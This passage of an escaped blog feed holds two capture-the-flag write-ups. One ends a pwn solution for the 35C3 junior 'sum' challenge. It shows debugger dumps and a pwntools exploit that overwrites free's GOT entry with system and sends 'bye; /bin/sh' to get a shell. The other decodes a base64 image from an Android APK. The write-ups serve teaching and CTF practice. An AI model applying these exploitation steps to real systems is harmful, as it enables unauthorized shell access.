R13: 0x400c95 --&amp;gt; 0x20656854006d7573 ('sum')
R14: 0x400caa --&amp;gt; 0x61766e4900657962 ('bye')
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400b32 &amp;lt;calculator+604&amp;gt;:   mov    eax,0x0
   0x400b37 &amp;lt;calculator+609&amp;gt;:   call   0x400790 &amp;lt;__printf_chk@plt&amp;gt;
   0x400b3c &amp;lt;calculator+614&amp;gt;:   mov    rdi,QWORD PTR [rsp+0x8]
=&amp;gt; 0x400b41 &amp;lt;calculator+619&amp;gt;:   call   0x400720 &amp;lt;free@plt&amp;gt;    &amp;lt;================= call to free -----
   0x400b46 &amp;lt;calculator+624&amp;gt;:   mov    rax,QWORD PTR [rsp+0x28]                                    |
   0x400b4b &amp;lt;calculator+629&amp;gt;:   xor    rax,QWORD PTR fs:0x28                                       |
   0x400b54 &amp;lt;calculator+638&amp;gt;:   jne    0x400b6a &amp;lt;calculator+660&amp;gt;                                   |
   0x400b56 &amp;lt;calculator+640&amp;gt;:   add    rsp,0x30                                                    |
Guessed arguments:                                                                                 |
arg[0]: 0x6036d0 --&amp;gt; 0xa3120000a657962 ('bye\n')  &amp;lt;========================= arguments to free-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;you can see gdb-peda guessed the arguments passed to free() call shows that it points to the string we enter.&lt;/p&gt;

&lt;p&gt;if we replace free() with system() and send “bye;/bin/sh”
insted of bye, we can get a shell. in then end thats what i did.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;free = exe.got[&quot;free&quot;]
p.sendline(&quot;set &quot;+str(free/8)+&quot; &quot;+str(system))
p.recvuntil(&quot;\n&amp;gt; &quot;)
p.sendline(&quot;bye; /bin/sh&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;first we get address of free from got of binary, and then we set free’s address devided by 8 because of this statement
                                &lt;strong&gt;mov    QWORD PTR [rax*8],rdx&lt;/strong&gt;
where the given address is multiplied by 8.
and thats it we are done.&lt;/p&gt;

&lt;p&gt;the final exploit looks like this.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ python exploit.py
[*] '/home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process './sum': pid 9623
[*] PUTS: 0x7ff45ee4f9c0
[*] LIBC BASE: 0x7ff45edcf000
[*] system() : 0x7ff45ee1e440
[*] Switching to interactive mode
sh: 1: bye: not found
$ ls
exploit.py  libc-2.27.so  sum-b22202e31d8d84ec55a8f7cb698e2d656622f806.zip
flag.txt    sum
$ cat flag.txt
flag{ctf_is_over_so_this_is_a_local_exploit_from_X3eRo0}
$  

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thanks for reading that.
                                                                                                ~by &lt;a href=&quot;https://twitter.com/X3eRo0&quot;&gt;X3eRo0&lt;/a&gt;&lt;/p&gt;</content><author><name>X3eRo0</name></author><summary type="html">Challenge: Sum(for 143 points)</summary></entry><entry><title type="html">Bsides Ctf Blink</title><link href="http://localhost:4000/2019/03/05/bsides-ctf-Blink.html" rel="alternate" type="text/html" title="Bsides Ctf Blink" /><published>2019-03-05T00:00:00+05:30</published><updated>2019-03-05T00:00:00+05:30</updated><id>http://localhost:4000/2019/03/05/bsides-ctf-Blink</id><content type="html" xml:base="http://localhost:4000/2019/03/05/bsides-ctf-Blink.html">&lt;h3 id=&quot;challenge-blinkfor-50-points&quot;&gt;Challenge: Blink(for 50 points)&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Description:

Get past the Jedi mind trick to find the flag you are looking for.
File: blink.apk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;
On installing the app on a mobile, we see this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/50_blink_COMPLETE/appMobileSS.png&quot; width=&quot;250px&quot; height=&quot;350px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then I used apktool to decompile it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apktool d blink.apk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Going into the smali folder created by apktool&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;blink/smali/com/example/blink
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;r2d2.smali&lt;/code&gt; file. Inside there’s a string of base64 encoded image.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/50_blink_COMPLETE/r2d2img.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I saved the string to &lt;code class=&quot;highlighter-rouge&quot;&gt;blink_r2d2.txt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat blink_r2d2.txt | base64 -d &amp;gt; flag.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On decoding the base64 string, and we get an image and the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/50_blink_COMPLETE/flag.jpg&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;thankyou-for-reading-happy-hackin--eshaan7&quot;&gt;Thankyou for reading, happy hackin’! ~ &lt;a href=&quot;https://eshaan7.cf/&quot;&gt;eshaan7&lt;/a&gt;&lt;/h4&gt;</content><author><name>eshaan7</name></author><summary type="html">Challenge: Blink(for 50 points)</summary></entry></feed>